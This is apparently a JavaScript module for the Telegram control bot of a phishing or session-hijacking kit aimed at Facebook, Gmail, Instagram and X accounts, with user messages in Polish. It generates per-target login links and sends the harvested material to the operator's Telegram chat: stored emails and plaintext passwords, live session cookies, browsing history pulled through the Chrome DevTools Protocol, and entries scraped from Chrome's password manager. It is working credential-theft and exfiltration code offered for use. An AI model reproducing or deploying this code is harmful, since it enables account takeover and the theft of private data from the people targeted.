// Telegram bot integration — mirrors the live activity log and sends
// cookies automatically once a login is detected. Entirely optional and
// best-effort: every export here is a silent no-op when TELEGRAM_BOT_TOKEN /
// TELEGRAM_CHAT_ID aren't configured, or when Telegram itself is unreachable.

import { config } from './config.js';

function apiUrl(method) {
  return `https://api.telegram.org/bot${config.telegramBotToken}/${method}`;
}

export function isEnabled() {
  return Boolean(config.telegramBotToken && config.telegramChatId);
}

export async function sendMessage(text, options) {
  if (!isEnabled()) return;
  const body = { chat_id: config.telegramChatId, text, disable_web_page_preview: true };
  if (options && options.parseMode) body.parse_mode = options.parseMode;
  try {
    await fetch(apiUrl('sendMessage'), {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify(body),
    });
  } catch { /* best-effort */ }
}

export async function sendDocument(buffer, filename, caption) {
  if (!isEnabled()) return;
  try {
    const boundary = '----spBoundary' + Date.now().toString(16);
    const parts = [];
    const text = (s) => parts.push(Buffer.from(s, 'utf8'));
    text(`--${boundary}\r\n`);
    text(`Content-Disposition: form-data; name="chat_id"\r\n\r\n${config.telegramChatId}\r\n`);
    if (caption) {
      text(`--${boundary}\r\n`);
      text(`Content-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n`);
    }
    text(`--${boundary}\r\n`);
    text(`Content-Disposition: form-data; name="document"; filename="${filename}"\r\n`);
    text(`Content-Type: application/octet-stream\r\n\r\n`);
    parts.push(buffer);
    text(`\r\n--${boundary}--\r\n`);
    await fetch(apiUrl('sendDocument'), {
      method: 'POST',
      headers: { 'content-type': `multipart/form-data; boundary=${boundary}` },
      body: Buffer.concat(parts),
    });
  } catch { /* best-effort */ }
}

export async function discoverChatId() {
  const res = await fetch(apiUrl('getUpdates') + '?limit=1&offset=-1');
  const data = await res.json();
  const upd = data.result?.[data.result.length - 1];
  return upd?.message?.chat?.id ?? upd?.channel_post?.chat?.id ?? null;
}

// ── Helper ────────────────────────────────────────────────────────────────────

async function replyTo(chatId, text) {
  try {
    await fetch(apiUrl('sendMessage'), {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text, disable_web_page_preview: true }),
    });
  } catch { /* best-effort */ }
}

// ── /adduser <login> <password> — create panel user ──────────────────────────

async function handlePanelAdduser(chatId, args) {
  if (args.length < 2) {
    await replyTo(chatId, '❌ Użycie: /adduser <login> <hasło>\nHasło min. 8 znaków.');
    return;
  }
  const username = String(args[0]).trim().toLowerCase();
  const password = String(args[1]);
  // Validate before touching userdb
  if (!/^[a-z0-9_-]{1,64}$/.test(username)) {
    await replyTo(chatId, '❌ Login: tylko litery a-z, cyfry, _ lub -. Max 64 znaki.');
    return;
  }
  if (password.length < 8) {
    await replyTo(chatId, '❌ Hasło za krótkie (min. 8 znaków).');
    return;
  }
  try {
    const { createUser } = await import('./userdb.js');
    await createUser(username, password);
    await replyTo(chatId, `✅ Użytkownik "${username}" utworzony.`);
  } catch (err) {
    if (err?.message === 'username_taken') {
      await replyTo(chatId, `❌ Login "${username}" już istnieje.`);
    } else {
      await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
    }
  }
}

// ── /users — list panel users ─────────────────────────────────────────────────

async function handleUsers(chatId) {
  try {
    const { listUsers } = await import('./userdb.js');
    const users = await listUsers();
    if (users.length === 0) {
      await replyTo(chatId, 'Brak użytkowników.');
      return;
    }
    const lines = users.map(u => {
      const date = new Date(u.createdAt).toISOString().slice(0, 10);
      const status = u.active ? '✓' : '✗';
      return `${status} ${u.username}  (${date})`;
    });
    await replyTo(chatId, `Użytkownicy (${users.length}):\n${lines.join('\n')}`);
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

// ── /deluser <login> — delete panel user ─────────────────────────────────────

async function handleDeluser(chatId, args) {
  if (args.length < 1) {
    await replyTo(chatId, '❌ Użycie: /deluser <login>');
    return;
  }
  const username = String(args[0]).trim().toLowerCase();
  try {
    const { deleteUser } = await import('./userdb.js');
    const { deleteSessionsByUsername } = await import('./session.js');
    const removed = await deleteUser(username);
    if (!removed) {
      await replyTo(chatId, `❌ Nie znaleziono użytkownika "${username}".`);
      return;
    }
    deleteSessionsByUsername(username);
    await replyTo(chatId, `✅ Usunięto użytkownika "${username}" i unieważniono jego sesje.`);
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

// ── /getpass [id] — show stored credentials ───────────────────────────────────

async function handleGetPass(chatId, args) {
  try {
    const { loadAccounts } = await import('./accounts.js');
    const list = await loadAccounts();
    if (args.length > 0) {
      const id = args[0].toLowerCase();
      const acc = list.find(a => a.id === id);
      if (!acc) { await replyTo(chatId, `❌ Nie znaleziono konta: "${id}"`); return; }
      const lines = [`📋 Konto: ${acc.label} (${acc.id})`];
      if (acc.email)    lines.push(`📧 Email: ${acc.email}`);
      if (acc.password) lines.push(`🔑 Hasło: ${acc.password}`);
      if (!acc.email && !acc.password) lines.push('(brak zapisanych danych logowania)');
      await replyTo(chatId, lines.join('\n'));
    } else {
      // List all accounts with stored credentials
      const withCreds = list.filter(a => a.email || a.password);
      if (withCreds.length === 0) { await replyTo(chatId, 'Brak zapisanych danych logowania.'); return; }
      const lines = [`🔐 Zapisane dane (${withCreds.length}):`];
      for (const acc of withCreds) {
        lines.push(`\n📋 ${acc.label} (${acc.id})`);
        if (acc.email)    lines.push(`  📧 ${acc.email}`);
        if (acc.password) lines.push(`  🔑 ${acc.password}`);
      }
      await replyTo(chatId, lines.join('\n'));
    }
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

// ── /cookies <id> — export cookies as JSON file ───────────────────────────────

async function handleCookies(chatId, args) {
  if (args.length < 1) {
    await replyTo(chatId, '❌ Użycie: /cookies <id>');
    return;
  }
  const id = args[0].toLowerCase();
  try {
    const { getAccount } = await import('./accounts.js');
    const acc = await getAccount(id);
    if (!acc) { await replyTo(chatId, `❌ Nie znaleziono konta: "${id}"`); return; }
    const { getContext } = await import('./browser.js');
    const ctx = getContext(id);
    if (!ctx) { await replyTo(chatId, `❌ Sesja "${id}" nie jest uruchomiona.`); return; }
    const cookies = await ctx.cookies();
    const json = JSON.stringify(cookies, null, 2);
    const buf = Buffer.from(json, 'utf8');
    await sendDocument(buf, `cookies-${id}.json`, `🍪 Cookies: ${acc.label}`);
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

// ── /accounts — list all accounts ────────────────────────────────────────────

async function handleAccounts(chatId) {
  try {
    const { loadAccounts } = await import('./accounts.js');
    const list = await loadAccounts();
    if (list.length === 0) { await replyTo(chatId, 'Brak kont.'); return; }
    const lines = [`📱 Konta (${list.length}):`];
    for (const acc of list) {
      const hasCreds = acc.email || acc.password ? ' 🔑' : '';
      lines.push(`• ${acc.id} — ${acc.label}${hasCreds}`);
    }
    lines.push('\nUżyj /getpass <id> lub /cookies <id>');
    await replyTo(chatId, lines.join('\n'));
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

// ── /addaccount <name> <platform> — create account ───────────────────────────

const PLATFORM_URLS = {
  facebook: 'https://www.facebook.com/', fb: 'https://www.facebook.com/',
  gmail: 'https://mail.google.com/mail/u/0/', gm: 'https://mail.google.com/mail/u/0/',
  google: 'https://mail.google.com/mail/u/0/',
  instagram: 'https://www.instagram.com/', ig: 'https://www.instagram.com/',
  twitter: 'https://x.com/', tw: 'https://x.com/', x: 'https://x.com/',
};
const PLATFORM_LABELS = {
  facebook: 'Facebook', fb: 'Facebook',
  gmail: 'Gmail', gm: 'Gmail', google: 'Gmail',
  instagram: 'Instagram', ig: 'Instagram',
  twitter: 'Twitter / X', tw: 'Twitter / X', x: 'Twitter / X',
};
const PLATFORM_CANONICAL = {
  facebook: 'facebook', fb: 'facebook',
  gmail: 'gmail', gm: 'gmail', google: 'gmail',
  instagram: 'instagram', ig: 'instagram',
  twitter: 'twitter', tw: 'twitter', x: 'twitter',
};

async function handleAddAccount(chatId, args, publicHost) {
  if (args.length < 2) {
    await replyTo(chatId, '❌ Użycie: /addaccount <imię> <platforma>\nPlatformy: facebook (fb), gmail (gm), instagram (ig), twitter (tw)');
    return;
  }
  const name = args[0];
  const platform = args[1].toLowerCase();
  const startUrl = PLATFORM_URLS[platform];
  if (!startUrl) {
    await replyTo(chatId, `❌ Nieznana platforma: "${platform}"\nDostępne: facebook (fb), gmail (gm), instagram (ig), twitter (tw)`);
    return;
  }
  const canonical = PLATFORM_CANONICAL[platform];
  const platLabel = PLATFORM_LABELS[platform];
  const label = `${name} – ${platLabel}`;
  const id = `${name}-${canonical}`.trim().toLowerCase().replace(/\s+/g, '-').replace(/[^a-z0-9_-]/g, '');
  if (!id) { await replyTo(chatId, '❌ Nazwa zawiera niedozwolone znaki.'); return; }
  try {
    const { saveAccount, getAccount } = await import('./accounts.js');
    const { start, stop, wipeProfile } = await import('./browser.js');
    const existed = Boolean(await getAccount(id));
    if (!existed) { await stop(id).catch(() => {}); await wipeProfile(id); }
    await saveAccount({ id, label, startUrl });
    await start(id, '127.0.0.1').catch(() => {});
    const saved = await getAccount(id);
    const ref = saved?.ref || '';
    const host = publicHost || config.publicHost;
    const link = ref && host ? `https://${host}/account/login?ref=${ref}` : '(brak PUBLIC_HOST)';
    await replyTo(chatId, `✅ Konto "${label}" utworzone!\n🔗 Link: ${link}`);
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

// ── /panel — inline keyboard main menu ───────────────────────────────────────

async function sendInlineMessage(chatId, text, inline_keyboard) {
  try {
    await fetch(apiUrl('sendMessage'), {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        reply_markup: { inline_keyboard },
        disable_web_page_preview: true,
      }),
    });
  } catch { /* best-effort */ }
}

async function answerCallback(callbackQueryId, text) {
  try {
    await fetch(apiUrl('answerCallbackQuery'), {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ callback_query_id: callbackQueryId, text: text || '' }),
    });
  } catch { /* best-effort */ }
}

async function handlePanel(chatId, publicHost) {
  try {
    const { loadAccounts } = await import('./accounts.js');
    const list = await loadAccounts();
    if (list.length === 0) {
      await replyTo(chatId, '📱 Brak kont. Użyj /addaccount <imię> <platforma>');
      return;
    }
    const keyboard = list.map(acc => {
      const icon = acc.email ? '🔑 ' : '';
      return [{ text: `${icon}${acc.label}`, callback_data: `acc:${acc.id}` }];
    });
    keyboard.push([{ text: '➕ Dodaj konto', callback_data: 'help:addaccount' }]);
    await sendInlineMessage(chatId, `📱 Konta (${list.length}):`, keyboard);
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

async function handleAccountMenu(chatId, accountId, callbackQueryId, publicHost) {
  try {
    const { getAccount } = await import('./accounts.js');
    const acc = await getAccount(accountId);
    if (!acc) { await answerCallback(callbackQueryId, '❌ Nie znaleziono konta'); return; }
    await answerCallback(callbackQueryId);

    const host = publicHost || config.publicHost;
    const link = acc.ref && host ? `https://${host}/account/login?ref=${acc.ref}` : null;

    const lines = [`📋 *${acc.label}*`];
    if (acc.email)    lines.push(`📧 ${acc.email}`);
    if (acc.password) lines.push(`🔑 ${acc.password}`);

    const keyboard = [
      [
        { text: '🔑 Hasła (plik)', callback_data: `pass:${accountId}` },
        { text: '🍪 Cookies', callback_data: `cook:${accountId}` },
      ],
      [
        { text: '📋 Historia wyszukiwań', callback_data: `hist:${accountId}` },
        { text: '🔐 Google Passwords', callback_data: `gpas:${accountId}` },
      ],
    ];
    if (link) keyboard.push([{ text: '🔗 Otwórz sesję', url: link }]);
    keyboard.push([{ text: '« Wróć', callback_data: 'panel' }]);

    await sendInlineMessage(chatId, lines.join('\n'), keyboard);
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

async function handlePassFile(chatId, accountId, callbackQueryId) {
  await answerCallback(callbackQueryId, '⏳ Generuję plik...');
  try {
    const { loadAccounts } = await import('./accounts.js');
    const list = await loadAccounts();
    const withCreds = accountId === 'all'
      ? list.filter(a => a.email || a.password)
      : list.filter(a => a.id === accountId && (a.email || a.password));
    if (withCreds.length === 0) {
      await replyTo(chatId, '(brak zapisanych danych logowania)');
      return;
    }
    const lines = [];
    for (const acc of withCreds) {
      lines.push(`=== ${acc.label} (${acc.id}) ===`);
      if (acc.email)    lines.push(`Email:  ${acc.email}`);
      if (acc.password) lines.push(`Hasło:  ${acc.password}`);
      lines.push('');
    }
    const buf = Buffer.from(lines.join('\n'), 'utf8');
    const fname = accountId === 'all' ? 'hasla-wszystkie.txt' : `hasla-${accountId}.txt`;
    await sendDocument(buf, fname, `🔑 Dane logowania${accountId === 'all' ? '' : ': ' + withCreds[0]?.label}`);
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

async function handleHistoryFile(chatId, accountId, callbackQueryId) {
  await answerCallback(callbackQueryId, '⏳ Pobieram historię...');
  try {
    const { getAccount } = await import('./accounts.js');
    const { getContext } = await import('./browser.js');
    const acc = await getAccount(accountId);
    if (!acc) { await replyTo(chatId, '❌ Nie znaleziono konta'); return; }
    const ctx = getContext(accountId);
    if (!ctx) { await replyTo(chatId, `❌ Sesja "${accountId}" nie jest uruchomiona. Uruchom konto najpierw.`); return; }

    // Pull history via CDP
    const pages = ctx.pages();
    if (!pages.length) { await replyTo(chatId, '❌ Brak otwartych stron'); return; }
    const page = pages[0];
    const cdp = await ctx.newCDPSession(page);
    const result = await cdp.send('History.getEntries').catch(() => null);
    await cdp.detach().catch(() => {});

    if (!result?.entries?.length) {
      await replyTo(chatId, '(brak historii lub historia niedostępna)');
      return;
    }
    const lines = result.entries.map(e => `${e.title || '(bez tytułu)'}\n${e.url}`);
    const buf = Buffer.from(lines.join('\n\n'), 'utf8');
    await sendDocument(buf, `historia-${accountId}.txt`, `📋 Historia: ${acc.label}`);
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

async function handleGooglePasswords(chatId, accountId, callbackQueryId) {
  await answerCallback(callbackQueryId, '⏳ Pobieram hasła z Chrome...');
  try {
    const { getAccount } = await import('./accounts.js');
    const { getContext } = await import('./browser.js');
    const acc = await getAccount(accountId);
    if (!acc) { await replyTo(chatId, '❌ Nie znaleziono konta'); return; }
    const ctx = getContext(accountId);
    if (!ctx) { await replyTo(chatId, `❌ Sesja "${accountId}" nie jest uruchomiona.`); return; }

    // Open chrome://password-manager/passwords on a new page so we don't
    // navigate away from the user's current session.
    const pwPage = await ctx.newPage();
    try {
      await pwPage.goto('chrome://password-manager/passwords', { waitUntil: 'domcontentloaded', timeout: 15000 });
      await pwPage.waitForTimeout(2000);

      // Traverse shadow DOM to extract password entries
      const entries = await pwPage.evaluate(() => {
        function deepQuery(root, sel) {
          const results = [];
          function walk(node) {
            if (!node) return;
            try {
              const found = node.querySelectorAll(sel);
              found.forEach(el => results.push(el));
            } catch {}
            const children = node.shadowRoot
              ? [node.shadowRoot, ...node.children]
              : [...(node.children || [])];
            children.forEach(walk);
          }
          walk(root);
          return results;
        }

        // Each entry in chrome://password-manager is a <password-list-item> element
        const items = deepQuery(document.body, 'password-list-item');
        if (items.length) {
          return items.map(item => {
            const origin  = item.shadowRoot?.querySelector('#originUrl')?.textContent?.trim()
                         || item.shadowRoot?.querySelector('.origin')?.textContent?.trim() || '';
            const user    = item.shadowRoot?.querySelector('#username')?.textContent?.trim()
                         || item.shadowRoot?.querySelector('.username')?.textContent?.trim() || '';
            return `${origin} | ${user}`;
          }).filter(s => s.trim() !== '|');
        }

        // Fallback: grab all text from the page
        const allText = document.body.innerText || '';
        return allText.split('\n').map(l => l.trim()).filter(l => l.length > 3);
      }).catch(() => []);

      if (!entries.length) {
        await replyTo(chatId, `❌ Brak zapisanych haseł w Chrome dla konta ${acc.label}.\nUpewnij się że konto jest zalogowane i ma hasła zapisane w przeglądarce.`);
        return;
      }

      const buf = Buffer.from(entries.join('\n'), 'utf8');
      await sendDocument(buf, `chrome-passwords-${accountId}.txt`, `🔐 Chrome Passwords: ${acc.label} (${entries.length} wpisów)`);
    } finally {
      await pwPage.close().catch(() => {});
    }
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

// ── Long-poll command listener ────────────────────────────────────────────────

export function startCommandListener(publicHost) {
  if (!config.telegramBotToken) return;
  const adminId = config.telegramAdminId ? String(config.telegramAdminId) : '';

  let offset = 0;
  let running = true;

  async function poll() {
    while (running) {
      try {
        const url = apiUrl('getUpdates') + `?timeout=30&offset=${offset}&allowed_updates=["message","callback_query"]`;
        const res = await fetch(url, { signal: AbortSignal.timeout(40_000) });
        if (!res.ok) { await new Promise(r => setTimeout(r, 5000)); continue; }
        const data = await res.json();
        for (const upd of data.result || []) {
          offset = upd.update_id + 1;

          // ── callback_query (inline keyboard button) ──
          if (upd.callback_query) {
            const cq = upd.callback_query;
            const fromId = String(cq.from?.id || '');
            if (adminId && fromId !== adminId) { await answerCallback(cq.id, '⛔ Brak dostępu'); continue; }
            const chatId = cq.message?.chat?.id;
            const d = cq.data || '';

            if (d === 'panel') {
              await handlePanel(chatId, publicHost);
              await answerCallback(cq.id);
            } else if (d.startsWith('acc:')) {
              await handleAccountMenu(chatId, d.slice(4), cq.id, publicHost);
            } else if (d.startsWith('pass:')) {
              await handlePassFile(chatId, d.slice(5), cq.id);
            } else if (d.startsWith('cook:')) {
              await answerCallback(cq.id, '⏳ Pobieram cookies...');
              await handleCookies(chatId, [d.slice(5)]);
            } else if (d.startsWith('hist:')) {
              await handleHistoryFile(chatId, d.slice(5), cq.id);
            } else if (d.startsWith('gpas:')) {
              await handleGooglePasswords(chatId, d.slice(5), cq.id);
            } else if (d === 'help:addaccount') {
              await answerCallback(cq.id);
              await replyTo(chatId, '➕ Użycie: /addaccount <imię> <platforma>\nPlatformy: facebook (fb), gmail (gm), instagram (ig), twitter (tw)');
            } else {
              await answerCallback(cq.id);
            }
            continue;
          }

          // ── message / command ──
          const msg = upd.message;
          if (!msg?.text) continue;
          const fromId = String(msg.from?.id || '');
          const chatId = msg.chat?.id;
          if (adminId && fromId !== adminId) continue;
          const text = msg.text.trim();
          const cmdMatch = text.match(/^(\/\w+)(?:@\S+)?\s*(.*)/s);
          if (!cmdMatch) continue;
          const cmd = cmdMatch[1].toLowerCase();
          const rest = cmdMatch[2].trim();
          const parts = rest ? rest.split(/\s+/) : [];

          if (cmd === '/panel' || cmd === '/start') {
            await handlePanel(chatId, publicHost);
          } else if (cmd === '/adduser') {
            await handlePanelAdduser(chatId, parts);
          } else if (cmd === '/users') {
            await handleUsers(chatId);
          } else if (cmd === '/deluser') {
            await handleDeluser(chatId, parts);
          } else if (cmd === '/addaccount') {
            await handleAddAccount(chatId, parts, publicHost);
          } else if (cmd === '/getpass') {
            await handleGetPass(chatId, parts);
          } else if (cmd === '/cookies') {
            await handleCookies(chatId, parts);
          } else if (cmd === '/accounts') {
            await handleAccounts(chatId);
          }
        }
      } catch {
        await new Promise(r => setTimeout(r, 5000));
      }
    }
  }

  poll().catch(() => {});
  return () => { running = false; };
}
